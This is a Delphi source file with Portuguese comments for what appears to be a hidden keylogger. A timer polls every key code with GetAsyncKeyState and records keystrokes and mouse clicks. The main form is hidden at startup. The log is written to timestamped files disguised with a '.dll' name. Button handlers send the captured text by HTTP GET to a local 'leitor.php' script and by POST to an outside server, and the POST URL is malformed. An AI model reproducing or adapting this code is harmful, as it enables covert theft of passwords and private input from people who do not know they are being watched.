unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdHTTP, jpeg;

type
  TForm1 = class(TForm)
    Memo1: TMemo;
    Timer1: TTimer;
    Label1: TLabel;
    Timer2: TTimer;
    IdHTTP1: TIdHTTP;
    Button1: TButton;
    Label2: TLabel;
    Button2: TButton;
    Button3: TButton;
    Image1: TImage;
    Label3: TLabel;
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.Timer1Timer(Sender: TObject);

var keyloop: Integer;
function caracter(txt: String): String;//declara??o da fun??o caracter
begin
Form1.Label2.Caption := Form1.Label2.Caption + txt;
end;

begin
keyloop:=0;
repeat
if GetAsyncKeyState(keyloop)= -32767 then
begin
case keyloop of
1: caracter(' [Click<] ');//captura se bot?o esquerdo do mouse for clicado
2: caracter(' [Click >] ');//captura se bot?o direito do mouse for clicado
4: caracter(' [Click Roda] ');//se roda do mouse for clicada
8: caracter(' [BackSpace] ');// se backspace for precionado
//o proprio codigo se explica 
9: caracter(' [Tab] ');
12: caracter(' [Alt] ');
13: caracter(' [Enter - '+ label1.Caption +']<br><br> ');
VK_LSHIFT: caracter(' [Shift <] ');
VK_RSHIFT: caracter(' [Shift >] ');
VK_LCONTROL: caracter(' [Ctrl <] ');
VK_RCONTROL: caracter(' [Ctrl >] ');
VK_LMENU: caracter(' [Alt <] ');
VK_RMENU: caracter(' [Alt >] ');
19: caracter(' [Pause] ');
20: caracter(' [CapsLock] ');
21: caracter(' [PageUp] ');
27: caracter(' [Esc] ');
32: caracter(' '); 
33: caracter(' [PageUp] ');
34: caracter(' [PageDown] ');
35: caracter(' [End] ');
36: caracter(' [Home] ');
37: caracter(' [Seta <] ');
38: caracter(' [Seta ^] ');
39: caracter(' [Seta >] ');
40: caracter(' [Seta v] ');
44: caracter(' [PrintScreen] ');
45: caracter(' [Insert] ');
46: caracter(' [Del] ');
65..90: caracter(Chr(keyloop));
91: caracter(' [Win <] ');
92: caracter(' [Win >] ');
93: caracter(' [Menu PopUp] ');
96: caracter(' [Num 0] ');
97: caracter(' [Num 1] ');
98: caracter(' [Num 2] ');
99: caracter(' [Num 3] ');
100: caracter(' [Num 4] ');
101: caracter(' [Num 5] ');
102: caracter(' [Num 6] ');
103: caracter(' [Num 7] ');
104: caracter(' [Num 8] ');
105: caracter(' [Num 9] ');
106: caracter(' [Num *] ');
107: caracter(' [Num +] ');
109: caracter(' [Num -] ');
110: caracter(' [Num Del] ');
111: caracter(' [Num /] ');
112: caracter(' [F1] ');
113: caracter(' [F2] ');
114: caracter(' [F3] ');
115: caracter(' [F4] ');
116: caracter(' [F5] ');
117: caracter(' [F6] ');
118: caracter(' [F7] ');
119: caracter(' [F8] ');
120: caracter(' [F9] ');
121: caracter(' [F10] ');
122: caracter(' [F11] ');
123: caracter(' [F12] ');
144: caracter(' [NumLock] ');
145: caracter(' [ScrollLock] ');
186: caracter('?');
187: caracter('=');
188: caracter(',');
189: caracter('-');
190: caracter('.');
191: caracter(';');
192: caracter('''');
193: caracter('/');
194: caracter(' [Num .] ');
219: caracter('?');
220: caracter(']');
221: caracter('[');
222: caracter('~');
226: caracter('\');
else
  if (keyloop>=41) and (keyloop <= 63) then//captura o restante das tecla
    caracter(Chr(keyloop));
  end; //fim case;
end;
inc(keyloop);
until
keyloop = 255;
end;//fim do procedure

procedure TForm1.Timer2Timer(Sender: TObject);
var  arq: TextFile;
    i, n: integer;

begin
  try
    Memo1.Text := DateTimeToStr(Now)  ;
    Memo1.Text :=  DateTimeToStr( Date);
    AssignFile(arq, 'temp'+Label3.Caption+'.dll');
    Rewrite(arq);
    Writeln(arq, Label2.Caption);
    Writeln(arq, '+-------------+');

    CloseFile(arq);
  except
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
var
 LINK: String;

begin
   
   LINK := 'http://localhost/leitor/leitor.php?texto='+Label2.Caption;
   IdHTTP1.HandleRedirects := True;
   IdHTTP1.Request.UserAgent := 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0';
   IdHTTP1.Get(LINK);
end;


procedure TForm1.Button2Click(Sender: TObject);
var
 PostData: TStringList;
  res: string;
begin
PostData:=TStringList.Create;
  try
    PostData.Add('texto='+Label2.Caption);
    res:=IdHTTP1.Post('http://http://sv1.com.br/leitor/leitor.php', PostData);
    Memo1.Lines.Text:=res;
  finally
    PostData.Free;
  end;
end;



function fnstUrlEncodeUTF8(stInput : widestring) : string;
  const
    hex : array[0..255] of string = (
     '%00', '%01', '%02', '%03', '%04', '%05', '%06', '%07',
     '%08', '%09', '%0a', '%0b', '%0c', '%0d', '%0e', '%0f',
     '%10', '%11', '%12', '%13', '%14', '%15', '%16', '%17',
     '%18', '%19', '%1a', '%1b', '%1c', '%1d', '%1e', '%1f',
     '%20', '%21', '%22', '%23', '%24', '%25', '%26', '%27',
     '%28', '%29', '%2a', '%2b', '%2c', '%2d', '%2e', '%2f',
     '%30', '%31', '%32', '%33', '%34', '%35', '%36', '%37',
     '%38', '%39', '%3a', '%3b', '%3c', '%3d', '%3e', '%3f',
     '%40', '%41', '%42', '%43', '%44', '%45', '%46', '%47',
     '%48', '%49', '%4a', '%4b', '%4c', '%4d', '%4e', '%4f',
     '%50', '%51', '%52', '%53', '%54', '%55', '%56', '%57',
     '%58', '%59', '%5a', '%5b', '%5c', '%5d', '%5e', '%5f',
     '%60', '%61', '%62', '%63', '%64', '%65', '%66', '%67',
     '%68', '%69', '%6a', '%6b', '%6c', '%6d', '%6e', '%6f',
     '%70', '%71', '%72', '%73', '%74', '%75', '%76', '%77',
     '%78', '%79', '%7a', '%7b', '%7c', '%7d', '%7e', '%7f',
     '%80', '%81', '%82', '%83', '%84', '%85', '%86', '%87',
     '%88', '%89', '%8a', '%8b', '%8c', '%8d', '%8e', '%8f',
     '%90', '%91', '%92', '%93', '%94', '%95', '%96', '%97',
     '%98', '%99', '%9a', '%9b', '%9c', '%9d', '%9e', '%9f',
     '%a0', '%a1', '%a2', '%a3', '%a4', '%a5', '%a6', '%a7',
     '%a8', '%a9', '%aa', '%ab', '%ac', '%ad', '%ae', '%af',
     '%b0', '%b1', '%b2', '%b3', '%b4', '%b5', '%b6', '%b7',
     '%b8', '%b9', '%ba', '%bb', '%bc', '%bd', '%be', '%bf',
     '%c0', '%c1', '%c2', '%c3', '%c4', '%c5', '%c6', '%c7',
     '%c8', '%c9', '%ca', '%cb', '%cc', '%cd', '%ce', '%cf',
     '%d0', '%d1', '%d2', '%d3', '%d4', '%d5', '%d6', '%d7',
     '%d8', '%d9', '%da', '%db', '%dc', '%dd', '%de', '%df',
     '%e0', '%e1', '%e2', '%e3', '%e4', '%e5', '%e6', '%e7',
     '%e8', '%e9', '%ea', '%eb', '%ec', '%ed', '%ee', '%ef',
     '%f0', '%f1', '%f2', '%f3', '%f4', '%f5', '%f6', '%f7',
     '%f8', '%f9', '%fa', '%fb', '%fc', '%fd', '%fe', '%ff');
 var
   iLen,iIndex : integer;
   stEncoded : string;
   ch : widechar;
 begin
   iLen := Length(stInput);
   stEncoded := '';
   for iIndex := 1 to iLen do
   begin
     ch := stInput[iIndex];
     if (ch >= 'A') and (ch <= 'Z') then
       stEncoded := stEncoded + ch
     else if (ch >= 'a') and (ch <= 'z') then
       stEncoded := stEncoded + ch
     else if (ch >= '0') and (ch <= '9') then
       stEncoded := stEncoded + ch
     else if (ch = ' ') then
       stEncoded := stEncoded + '+'
     else if ((ch = '-') or (ch = '_') or (ch = '.') or (ch = '!') or (ch = '*')
       or (ch = '~') or (ch = '\')  or (ch = '(') or (ch = ')')) then
       stEncoded := stEncoded + ch
     else if (Ord(ch) <= $07F) then
       stEncoded := stEncoded + hex[Ord(ch)]
     else if (Ord(ch) <= $7FF) then
     begin
        stEncoded := stEncoded + hex[$c0 or (Ord(ch) shr 6)];
        stEncoded := stEncoded + hex[$80 or (Ord(ch) and $3F)];
     end
     else
     begin
        stEncoded := stEncoded + hex[$e0 or (Ord(ch) shr 12)];
        stEncoded := stEncoded + hex[$80 or ((Ord(ch) shr 6) and ($3F))];
        stEncoded := stEncoded + hex[$80 or ((Ord(ch)) and ($3F))];
     end;
   end;
   result := (stEncoded);
 end;

procedure TForm1.Button3Click(Sender: TObject);
var  arq: TextFile;
    i, n: integer;

begin
  try
 // Memo1.Text := DateTimeToStr(Now)  ;
    Memo1.Text :=  DateTimeToStr( Date);
    AssignFile(arq, 'temp.dll');
    Rewrite(arq);
    Writeln(arq, Label2.Caption);
    Writeln(arq, '+-------------+');

    CloseFile(arq);
  except
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
//vai ocultar o form
  application.ShowMainForm := False;
end;

procedure TForm1.Timer3Timer(Sender: TObject);
begin
Label3.Caption :=  FormatDateTime('ddmmyyyyhhmm', Now);
end;

end.
